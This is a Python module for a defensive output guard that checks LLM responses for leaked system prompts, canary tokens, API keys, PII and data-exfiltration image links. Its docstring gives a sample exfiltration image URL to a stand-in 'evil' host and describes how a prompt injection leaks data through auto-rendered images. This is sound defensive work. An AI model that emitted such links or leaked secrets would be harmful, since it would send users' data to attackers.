"""Output-side guard: inspects what the model is about to return.

Input filtering is never complete, so the second line of defence is checking
whether an injection *succeeded*:

* **Canary tokens** — a random marker planted in the system prompt. If it
  appears in the output, the system prompt leaked. Zero false positives.
* **System-prompt overlap** — word-shingle overlap with the real system
  prompt catches paraphrase-free leaks even without a canary.
* **Secrets / PII** — API keys, private keys, JWTs, card numbers (Luhn-checked).
* **Exfiltration links** — markdown images / links to non-allow-listed hosts.
  A rendered `![](https://evil/?d=...)` leaks data with zero user clicks.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import asdict, dataclass, field
from urllib.parse import parse_qs, urlparse

SECRET_PATTERNS: dict[str, re.Pattern] = {
    "aws_access_key_id": re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),
    "private_key_block": re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY(?: BLOCK)?-----"),
    "github_token": re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b"),
    "slack_token": re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b"),
    "anthropic_api_key": re.compile(r"\bsk-ant-[A-Za-z0-9_-]{20,}"),
    "openai_style_key": re.compile(r"\bsk-(?!ant-)(?:proj-)?[A-Za-z0-9_-]{32,}\b"),
    "jwt": re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b"),
    "google_api_key": re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b"),
}

PII_PATTERNS: dict[str, re.Pattern] = {
    "us_ssn": re.compile(r"\b(?!000|666|9\d\d)\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b"),
    "email_address": re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"),
}

CARD_CANDIDATE = re.compile(r"\b(?:\d[ -]?){13,19}\b")
MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(<?)(https?://[^)\s>]+)\1\s*(?:\"[^\"]*\")?\)")
MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(https?://[^)\s]+)\s*\)")
HTML_IMG = re.compile(r"<img[^>]+src\s*=\s*[\"'](https?://[^\"']+)[\"']", re.IGNORECASE)

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


@dataclass
class OutputFinding:
    kind: str
    severity: str
    detail: str


@dataclass
class OutputScanResult:
    findings: list[OutputFinding] = field(default_factory=list)

    @property
    def leaked(self) -> bool:
        return any(f.severity in ("critical", "high") for f in self.findings)

    @property
    def worst_severity(self) -> str:
        if not self.findings:
            return "none"
        return min(self.findings, key=lambda f: SEVERITY_ORDER[f.severity]).severity

    def to_dict(self) -> dict:
        return {
            "leaked": self.leaked,
            "worst_severity": self.worst_severity,
            "findings": [asdict(f) for f in self.findings],
        }


def make_canary(prefix: str = "CANARY") -> str:
    """A high-entropy marker to embed in a system prompt, e.g.
    `Never output this string: CANARY-3f9c2a7d1e5b4c60`."""
    return f"{prefix}-{secrets.token_hex(8)}"


def luhn_valid(number: str) -> bool:
    digits = [int(d) for d in number if d.isdigit()]
    if not 13 <= len(digits) <= 19:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def _redact(value: str) -> str:
    return value[:4] + "…" + value[-2:] if len(value) > 8 else "…"


def _shingles(text: str, n: int) -> set[tuple[str, ...]]:
    words = re.findall(r"[a-z0-9']+", text.lower())
    return {tuple(words[i:i + n]) for i in range(len(words) - n + 1)}


def system_prompt_overlap(output: str, system_prompt: str, n: int = 6) -> float:
    """Fraction of the system prompt's n-word shingles that appear in the output."""
    sp = _shingles(system_prompt, n)
    if not sp:
        return 0.0
    return len(sp & _shingles(output, n)) / len(sp)


def _host_allowed(host: str, allowlist: set[str]) -> bool:
    host = host.lower().split(":")[0]
    return any(host == d or host.endswith("." + d) for d in allowlist)


class OutputGuard:
    def __init__(
        self,
        canaries: list[str] | None = None,
        system_prompt: str | None = None,
        allowed_domains: list[str] | None = None,
        overlap_threshold: float = 0.25,
        check_pii: bool = True,
    ):
        self.canaries = [c for c in (canaries or []) if c]
        self.system_prompt = system_prompt
        self.allowed_domains = {d.lower().lstrip(".") for d in (allowed_domains or [])}
        self.overlap_threshold = overlap_threshold
        self.check_pii = check_pii

    def _check_urls(self, output: str) -> list[OutputFinding]:
        findings = []
        for match in MD_IMAGE.finditer(output):
            url = match.group(2)
            findings.extend(self._judge_url(url, rendered=True))
        for match in HTML_IMG.finditer(output):
            findings.extend(self._judge_url(match.group(1), rendered=True))
        for match in MD_LINK.finditer(output):
            findings.extend(self._judge_url(match.group(1), rendered=False))
        return findings

    def _judge_url(self, url: str, rendered: bool) -> list[OutputFinding]:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if _host_allowed(host, self.allowed_domains):
            return []
        params = parse_qs(parsed.query)
        has_payload = bool(params) or len(parsed.path) > 80
        if rendered:
            severity = "high" if has_payload else "medium"
            kind = "exfil_image_url"
            detail = f"Auto-rendered image to non-allow-listed host {host}" + (
                f" carrying query params {sorted(params)}" if params else "")
        else:
            if not has_payload:
                return []
            severity = "medium"
            kind = "suspicious_link"
            detail = f"Link to non-allow-listed host {host} with query params {sorted(params)}"
        return [OutputFinding(kind, severity, detail)]

    def scan(self, output: str) -> OutputScanResult:
        result = OutputScanResult()

        for canary in self.canaries:
            if canary in output:
                result.findings.append(OutputFinding(
                    "canary_leak", "critical", f"Canary token {_redact(canary)} present — system prompt leaked"))

        if self.system_prompt:
            overlap = system_prompt_overlap(output, self.system_prompt)
            if overlap >= self.overlap_threshold:
                result.findings.append(OutputFinding(
                    "system_prompt_leak", "high",
                    f"{overlap:.0%} of system-prompt 6-word shingles reproduced in output"))

        for name, pattern in SECRET_PATTERNS.items():
            for match in pattern.finditer(output):
                result.findings.append(OutputFinding(
                    "secret", "critical", f"{name}: {_redact(match.group(0))}"))

        if self.check_pii:
            for match in CARD_CANDIDATE.finditer(output):
                if luhn_valid(match.group(0)):
                    result.findings.append(OutputFinding(
                        "pii", "high", f"payment card number (Luhn-valid): {_redact(match.group(0).replace(' ', ''))}"))
            for match in PII_PATTERNS["us_ssn"].finditer(output):
                result.findings.append(OutputFinding("pii", "high", f"US SSN pattern: ***-**-{match.group(0)[-4:]}"))
            emails = set(PII_PATTERNS["email_address"].findall(output))
            if len(emails) >= 3:
                # One email in an answer is normal; a list of them is a dump.
                result.findings.append(OutputFinding("pii", "medium", f"{len(emails)} distinct email addresses"))

        result.findings.extend(self._check_urls(output))
        result.findings.sort(key=lambda f: SEVERITY_ORDER[f.severity])
        return result
